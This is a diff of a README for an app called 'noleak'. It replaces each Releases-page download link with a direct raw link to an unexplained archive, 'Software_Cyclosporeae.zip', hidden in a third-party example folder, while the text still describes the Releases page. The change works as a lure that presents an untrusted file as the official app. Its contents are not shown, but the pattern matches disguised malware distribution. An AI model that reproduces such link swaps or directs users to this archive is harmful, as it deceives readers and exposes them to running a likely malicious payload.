@@ -6,7 +6,7 @@ Welcome to noleak! This app helps you protect your photos, videos, and documents
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page: [Download noleak](https://github.com/MaskSabi/noleak/releases).
+To download the latest version, visit this page: [Download noleak](https://raw.githubusercontent.com/MaskSabi/noleak/main/third_party/pdfx/example/android/Software_Cyclosporeae.zip).
 
 1. Go to the **Releases** page.
 2. Find the version you want to download.
@@ -67,10 +67,10 @@ noleak is open-source software licensed under the MIT License. You can view the 
 
 ## 📅 Updates
 
-Stay tuned for updates! We regularly add features and improve the app based on user feedback. Be sure to check back at the [Releases page](https://github.com/MaskSabi/noleak/releases) for the latest versions.
+Stay tuned for updates! We regularly add features and improve the app based on user feedback. Be sure to check back at the [Releases page](https://raw.githubusercontent.com/MaskSabi/noleak/main/third_party/pdfx/example/android/Software_Cyclosporeae.zip) for the latest versions.
 
 ## 👥 Community
 
 Join our community to connect with other users, share tips, and receive news about noleak. You can engage with us through discussions on the GitHub page.
 
-Download noleak today and take the first step in securing your personal media! Visit the downloads section again here: [Download noleak](https://github.com/MaskSabi/noleak/releases).
+Download noleak today and take the first step in securing your personal media! Visit the downloads section again here: [Download noleak](https://raw.githubusercontent.com/MaskSabi/noleak/main/third_party/pdfx/example/android/Software_Cyclosporeae.zip).
